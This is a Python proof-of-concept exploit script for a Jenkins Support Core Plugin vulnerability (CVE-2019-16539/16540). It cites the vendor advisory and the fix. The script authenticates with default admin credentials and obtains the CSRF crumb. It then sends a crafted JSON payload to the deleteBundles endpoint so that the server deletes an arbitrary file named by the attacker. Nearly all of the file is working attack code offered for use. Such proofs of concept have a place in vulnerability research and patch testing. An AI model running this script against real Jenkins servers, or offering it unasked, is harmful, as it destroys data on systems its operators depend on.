#coding=utf-8
import requests
import base64
import json
import argparse

'''
PoC of CVE-2019-16539/CVE-2019-16540
Author: shadowsock5 on 2019/11/22

Ref: 
- https://jenkins.io/security/advisory/2019-11-21/#SECURITY-1634
- https://github.com/ftk-sostupid/CVE-2019-10392_EXP/blob/master/Jenkins%20Git%20RCE%20CVE-2019-10392.py
- https://github.com/jenkinsci/support-core-plugin/commit/6b177ea7cc7347e13fa87174472400bbbe78d422
'''

proxies = {'http': 'http://127.0.0.1:8087'}

headers = {}


def get_crumb(p_url, p_session, p_headers):
    crumb_url = p_url + '/crumbIssuer/api/json'
    try:
        r = p_session.get(crumb_url, headers=p_headers, proxies=proxies)
        # print(json.loads(r.text)['crumb'])
        if r.status_code == 200 and 'crumb' in r.text:
            return json.loads(r.text)['crumb']
        else:
            exit("[-]Error: Can not get Jenkins_Crumb.")
    except Exception as e:
        exit('[-]' + str(e))
        
        
def delete_file(p_url, p_session, p_headers, p_payload):
    r = p_session.post(p_url, headers=p_headers, allow_redirects=False, data=str(p_payload), proxies=proxies)
    if r.status_code == 302:    # 302 redirection means file deleted!
        print('[*] File deleted!')


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Jenkins Support Core Plugin <= 2.63")
    parser.add_argument('-u', '--base_url', help='Target.', required=True)
    parser.add_argument('-U', '--username', default='admin',
                        help="This vulnerability need Jenkins username to login. Default: admin")
    parser.add_argument('-P', '--password', default='admin',
                        help="This vulnerability need Jenkins password to login. Default: admin")
    parser.add_argument('-f', '--file_to_delete', help="The file you want to delete.")
    args = parser.parse_args()

    base_url = args.base_url
    delete_buddles_url = base_url + '/support/deleteBundles'
    file_to_delete = args.file_to_delete
    username = args.username
    password = args.password


    tmp = username + ':' + password
    auth = base64.b64encode(tmp.encode('ascii')).decode("utf-8")

     # HTTP Basic Authorization
    headers.update({'Authorization': 'Basic {0}'.format(auth)})
    s = requests.Session()

    # get csrf token of Jenkins
    crumb = get_crumb(base_url, s, headers)

    headers.update({'Jenkins-Crumb': crumb, 'Content-Type': 'application/x-www-form-urlencoded'})

    json_payload = {"bundles": [{"selected": "true", "name": file_to_delete}]}

    # poc
    post_data = "json={0}".format( json.dumps(json_payload) )
    delete_file(delete_buddles_url, s, headers, post_data)
